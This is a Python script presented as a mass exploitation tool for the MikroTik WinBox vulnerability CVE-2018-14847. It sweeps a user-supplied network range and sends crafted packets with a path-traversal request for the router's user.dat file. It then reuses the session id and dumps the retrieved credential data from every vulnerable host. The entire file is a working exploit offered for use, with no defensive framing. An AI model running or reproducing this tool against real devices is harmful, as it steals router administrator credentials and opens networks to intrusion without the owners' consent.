#!/usr/bin/env python3
import ipaddress
import socket
import sys
from extract_user import dump
 
print(r"""\
___  ____ _            _____ _ _     ______                _   
|  \/  (_) |          |_   _(_) |    | ___ \              | |  
| .  . |_| | ___ __ ___ | |  _| | __ | |_/ / ___  __ _ ___| |_ 
| |\/| | | |/ / '__/ _ \| | | | |/ / | ___ \/ _ \/ _` / __| __|
| |  | | |   <| | | (_) | | | |   <  | |_/ /  __/ (_| \__ \ |_ 
\_|  |_/_|_|\_\_|  \___/\_/ |_|_|\_\ \____/ \___|\__,_|___/\__|
                                                               
                                                               
  Mass MikroTik WinBox Exploitation tool, CVE-2018-14847                                                  
                                                                          """)
print("***Accepted input examples***")
print("Example 1 --> '192.168.5.0/24'")
print("Example 2 --> '172.16.0.0/16'")
print("\n")



a = [0x68, 0x01, 0x00, 0x66, 0x4d, 0x32, 0x05, 0x00,
     0xff, 0x01, 0x06, 0x00, 0xff, 0x09, 0x05, 0x07,
     0x00, 0xff, 0x09, 0x07, 0x01, 0x00, 0x00, 0x21,
     0x35, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2e, 0x2f,
     0x2e, 0x2e, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f,
     0x2e, 0x2f, 0x2e, 0x2e, 0x2f, 0x2f, 0x2f, 0x2f,
     0x2f, 0x2f, 0x2e, 0x2f, 0x2e, 0x2e, 0x2f, 0x66,
     0x6c, 0x61, 0x73, 0x68, 0x2f, 0x72, 0x77, 0x2f,
     0x73, 0x74, 0x6f, 0x72, 0x65, 0x2f, 0x75, 0x73,
     0x65, 0x72, 0x2e, 0x64, 0x61, 0x74, 0x02, 0x00,
     0xff, 0x88, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
     0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0xff, 0x88,
     0x02, 0x00, 0x02, 0x00, 0x00, 0x00, 0x02, 0x00,
     0x00, 0x00]

b = [0x3b, 0x01, 0x00, 0x39, 0x4d, 0x32, 0x05, 0x00,
     0xff, 0x01, 0x06, 0x00, 0xff, 0x09, 0x06, 0x01,
     0x00, 0xfe, 0x09, 0x35, 0x02, 0x00, 0x00, 0x08,
     0x00, 0x80, 0x00, 0x00, 0x07, 0x00, 0xff, 0x09,
     0x04, 0x02, 0x00, 0xff, 0x88, 0x02, 0x00, 0x00,
     0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01,
     0x00, 0xff, 0x88, 0x02, 0x00, 0x02, 0x00, 0x00,
     0x00, 0x02, 0x00, 0x00, 0x00]

 

 
cidr = input("Enter network in CIDR: ")
 

try:
	port = int(input("Enter WinBox port [8291]: "))
except ValueError:
	print("Using default port 8291")
	port = 8291 #Default WinBox port.

print("Exploit starting...")
for ip in ipaddress.IPv4Network(cidr).hosts():

     print("***")
     print(str(ip))
     print("***")


     ip = str(ip)
    
     
 

     #Initialize Socket
     s = socket.socket()
     s.settimeout(3)
     try:
         s.connect((ip, port))
     except Exception as e:
         print("Connection error: " + str(e))
         continue

     #Convert to bytearray for manipulation
     a = bytearray(a)
     b = bytearray(b)

     #Send hello and recieve the sesison id
     s.send(a)
     try:
         d = bytearray(s.recv(1024))
     except Exception as e:
         print("Connection error: " + str(e))
         continue

     #Replace the session id in template
     b[19] = d[38]

     #Send the edited response
     s.send(b)
     d = bytearray(s.recv(1024))

     #Get results
     print("Connected to " + ip + ":" + str(port))
     if len(d[55:]) > 25:
         print("Exploit successful")
         dump(d[55:])
     else:
         print("Exploit failed")
print("All Done.")
